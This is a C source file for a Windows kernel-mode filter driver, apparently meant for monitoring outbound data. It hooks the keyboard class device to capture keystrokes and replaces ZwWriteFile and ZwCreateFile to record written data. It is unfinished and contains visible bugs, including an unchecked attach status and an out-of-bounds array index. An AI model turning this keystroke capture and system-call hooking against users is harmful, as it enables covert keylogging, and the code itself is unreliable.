/*
 * Module: obhook.c
 * Author: Christopher Wood
 * Description: Keyboard hook for the outbound filter driver.
 * Environment: Kernel mode only
 */

#include "driver.h"
#include "hook.h"
#include "scancode.h"
#include "compare.h"
#include "thread.h"
#include "ntddkbd.h"

int numPendingIrps = 0;
int bufferQueueSize = 0;
int writeQueueSize = 0;
extern OldZwWriteFile;
extern OldZwCreateFile;

//KEY_QUEUE      *bufferQueue; 
KEY_QUEUE *writeQueue; 

/* OutboundHookKeyboard */
NTSTATUS OutboundHookKeyboard(IN PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_OBJECT     pKeyboardDeviceObject; // filter device object
	PDEVICE_EXTENSION  pKeyboardDeviceExtension; // device extension
	NTSTATUS           status;
	CCHAR		       ntNameBuffer[64] = "\\Device\\KeyboardClass0";
	STRING		       ntNameString;
	UNICODE_STRING     uKeyboardDeviceName;
	PFILE_OBJECT       pKeyboardDeviceFileObject;

	// Create a keyboard device object.
	status = IoCreateDevice(pDriverObject,
							sizeof(DEVICE_EXTENSION),
							NULL, // no name for filter devices
							FILE_DEVICE_KEYBOARD,
							0,
							TRUE,
							&pKeyboardDeviceObject);

	if(!NT_SUCCESS(status))
	{
        DbgPrint("Keyboard device creation failed.\n");
		return status;
	}


	// Copy the characteristics of the target keyboard driver into the filter device object
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
	DbgPrint("Device flags were set succesfully.\n");

	// Initialize the device extension
	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
	DbgPrint("Device Extension initialized.\n");

	// Get the pointer to the device extension
	pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;

	// Insert the filter driver onto the top of the keyboard device stack
    RtlInitAnsiString(&ntNameString, ntNameBuffer );
    RtlAnsiStringToUnicodeString(&uKeyboardDeviceName, &ntNameString, TRUE);
	IoAttachDevice(pKeyboardDeviceObject, &uKeyboardDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
	if (!NT_SUCCESS(status))
	{
        DbgPrint("Driver failed to attach to the top of the keyboard stack.\n");
		return status;
	}
	RtlFreeUnicodeString(&uKeyboardDeviceName);

	// Allocate memory for the queue.
	writeQueue = (KEY_QUEUE*)ExAllocatePool(NonPagedPool, sizeof(KEY_QUEUE));

	// Initialize the fields of both the buffer and write queue.
	InitializeListHead(&pKeyboardDeviceExtension->bufferQueue.QueueListHead);
	InitializeListHead(&writeQueue->QueueListHead);
	KeInitializeSpinLock(&pKeyboardDeviceExtension->bufferQueue.lockQueue);
	KeInitializeSpinLock(&writeQueue->lockQueue);
	KeInitializeSemaphore(&pKeyboardDeviceExtension->bufferQueue.semQueue, 0, MAXLONG);
	KeInitializeSemaphore(&writeQueue->semQueue, 0, MAXLONG);
	
	// Initialize worker and extraction threads.
	InitThreads(pDriverObject, writeQueue);

	return STATUS_SUCCESS;
} //end OutboundHookKeyboard

/* OutboundDispatchRead */
NTSTATUS 
OutboundDispatchRead(
	IN PDEVICE_OBJECT pDeviceObject, 
	IN PIRP pIrp
	)
{
	NTSTATUS  status;
	ULONG     stackSize;
	PIRP      tempIrp;

#if DEBUG
	DbgPrint("\nBegin OutboundDispatchRead routine.\n");
#endif

    //TODO: do something nifty here

	// Copy the stack location of this driver to the next one since we are just skipping it.
	IoCopyCurrentIrpStackLocationToNext(pIrp);

	// Set the completion callback
	IoSetCompletionRoutine(pIrp,
						OutboundOnReadCompletionRoutine,
						pDeviceObject,
						TRUE,
						TRUE,
						TRUE);

	// Track the number of pending IRPs
	numPendingIrps++;

	// Forward the IRP down the stack.
	status = IoCallDriver(((PDEVICE_EXTENSION) pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);

	return status;
} //end OutboundDispatchRead

/* OutboundOnReadCompletionRoutine */
NTSTATUS
OutboundOnReadCompletionRoutine(
    IN PDEVICE_OBJECT pDeviceObject,
    IN PIRP pIrp,
    IN PVOID Context
    )
{
    // Local variables
	PDEVICE_EXTENSION     pKeyboardDeviceExtension;
	PDEVICE_OBJECT        pKeyboardDeviceObject;
	PKEYBOARD_INPUT_DATA  keys;
	ULONG                 numKeys;
	ULONG                 counter;
	WCHAR                 tempKeys[3]; // should be set to the number of keys numKeys, which is below?
	KEVENT                event;
	KEY_DATA              *keyData;

	DbgPrint("\nBegin OutboundOnReadCompletion Routine.\n");

	pKeyboardDeviceExtension = (PDEVICE_EXTENSION*)pDeviceObject->DeviceExtension;
	pKeyboardDeviceObject = pKeyboardDeviceExtension->pKeyboardDevice;
	keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
	numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

    // Display numkeys - for tests
	DbgPrint("numKeys = %d\n", numKeys);

	for (counter = 0; counter < numKeys; counter++)
	{
		keyData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
		keyData->KeyData = (char)keys[counter].MakeCode;
		keyData->KeyFlags = (char)keys[counter].Flags;

		if (keys[counter].Flags == KEY_BREAK) // only concerned with key breaks
		{
			ConvertScanCode(pKeyboardDeviceExtension, keyData, tempKeys);
			keyData->Data = tempKeys[counter];
			DbgPrint("Converted scancode is: %c\n", tempKeys[counter]); // this works for alpha letters only for now

			// Enqueue the new data
			ExInterlockedInsertTailList(&pKeyboardDeviceExtension->bufferQueue.QueueListHead,
										&keyData->ListEntry,
										&pKeyboardDeviceExtension->bufferQueue.lockQueue);
			bufferQueueSize++;

			// Cut down the queue if it's too big
			if (bufferQueueSize > BUFFER_QUEUE_SIZE)
			{
				ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->bufferQueue.QueueListHead,
											&pKeyboardDeviceExtension->bufferQueue.lockQueue);
				bufferQueueSize--;
				DbgPrint("bufferQueue was too big, chopped it down to size.\n");
			}
			DbgPrint("Enqueued data: %c\n", keyData->Data);
			//DbgPrint("Current BufferQueueSize: %d\n", bufferQueueSize);
		}
	}

    // DEBUG: Traverse the queue and print it's contents
    //traverseQueue(bufferQueue);

	// Mark IRP pending if necessary
	if(pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	// Decrement the # of pending IRPs
	numPendingIrps--;

	DbgPrint("numPendingIrps: %d\n", numPendingIrps);

	return pIrp->IoStatus.Status;
} // end OutboundOnReadCompletionRoutine

/* NewZwWriteFile */
NTSTATUS
NewZwWriteFile(
    IN HANDLE FileHandle,
    IN HANDLE Event,
    IN PIO_APC_ROUTINE ApcRoutine,
    IN PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length,
    IN PLARGE_INTEGER ByteOffset,
    IN PULONG Key
    )
{
    // Local variables
	NTSTATUS    status;
	char       bufferData;
	KEY_DATA    *keyData;


	DbgPrint("\nHooked ZwWriteFile called.\n");

	if (numPendingIrps > 0) // driver is still dealing with pendng IRPs
	{
		// Retrieve the data from the write buffer and add it to the KEY_DATA struct
        bufferData = (char)(*((char*)(Buffer)));
		keyData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
		keyData->Data = bufferData;

		DbgPrint("Data being written using ZwWriteFile: %c\n", bufferData);
		DbgPrint("Enqueueing new data\n");

        // Enqueue the new data
		ExInterlockedInsertTailList(&writeQueue->QueueListHead,
									&keyData->ListEntry,
									&writeQueue->lockQueue);
		writeQueueSize++;

		// Cut down the queue if it's too big
		if (writeQueueSize > WRITE_QUEUE_SIZE)
		{
			ExInterlockedRemoveHeadList(&writeQueue->QueueListHead,
										&writeQueue->lockQueue);
			writeQueueSize--;
		}
	}

    // DEBUG: Traverse the queue and print it's contents
    //traverseQueue(writeQueue);

	// If no errors, call the original function
	((ZWWRITEFILE)(OldZwWriteFile))(FileHandle,
									Event,
									ApcRoutine,
									ApcContext,
									IoStatusBlock,
									Buffer,
									Length,
									ByteOffset,
									Key);

	return STATUS_SUCCESS;
} // end NewZwWriteFile

/* NewZwCreateFile */
NTSTATUS
NewZwCreateFile(
    IN HANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    __in_opt PLARGE_INTEGER AllocationSize,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    __in_opt PVOID EaBuffer,
    IN ULONG EaLength
    )
{
    // Local variables
	NTSTATUS status;

	//DbgPrint("ZwCreateFile called.\n");

	// TODO: implement this function

	// Call the original
	((ZWCREATEFILE)(OldZwCreateFile))(FileHandle,
                                    DesiredAccess,
                                    ObjectAttributes,
                                    IoStatusBlock,
                                    AllocationSize,
                                    FileAttributes,
                                    ShareAccess,
                                    CreateDisposition,
                                    CreateOptions,
                                    EaBuffer,
                                    EaLength);

	return STATUS_SUCCESS;
} // end NewZwCreateFile 
